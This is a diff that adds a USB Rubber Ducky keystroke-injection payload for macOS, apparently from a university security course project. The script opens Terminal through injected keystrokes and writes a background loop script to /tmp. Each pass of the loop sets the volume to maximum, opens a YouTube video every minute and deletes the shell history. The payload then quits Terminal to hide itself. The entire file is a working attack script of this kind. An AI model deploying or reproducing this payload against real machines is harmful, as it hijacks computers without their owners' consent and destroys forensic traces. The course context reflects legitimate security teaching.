@@ -1,0 +1,53 @@
+REM Author: Brian Sung
+REM This is a course project developed at University of San Francisco. Only for academic or personal use, not for any commercial purpose.
+REM CS683@USFCA
+REM Target: MACOS
+REM Reference: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---osx-youtube-blaster
+
+REM Opening terminal
+DELAY 2000
+GUI space
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+
+REM Preparing script to open youtube with maximum volume every 60 seconds
+STRING echo "#!/bin/bash" >> /tmp/youuuuutube.sh
+ENTER
+DELAY 300
+STRING echo "while [ true ]" >> /tmp/youuuuutube.sh
+ENTER
+DELAY 300
+STRING echo "do" >> /tmp/youuuuutube.sh
+ENTER
+DELAY 300
+STRING echo "osascript -e 'set volume 7'" >> /tmp/youuuuutube.sh
+ENTER
+DELAY 300
+STRING echo "open https://youtu.be/34Udmn2EtzY?t=1" >> /tmp/youuuuutube.sh
+ENTER
+DELAY 300
+STRING echo "history -c && rm .bash_history" >> /tmp/youuuuutube.sh
+ENTER
+DELAY 300
+STRING echo "sleep 60" >> /tmp/youuuuutube.sh
+ENTER
+DELAY 300
+STRING echo "done" >> /tmp/youuuuutube.sh
+ENTER
+DELAY 300
+
+REM Making the script executable and running it in background
+STRING chmod +x /tmp/youuuuutube.sh
+DELAY 300
+ENTER
+STRING /tmp/youuuuutube.sh &
+DELAY 300
+ENTER
+
+REM Cleaning up
+STRING exit
+ENTER
+DELAY 300
+GUI q
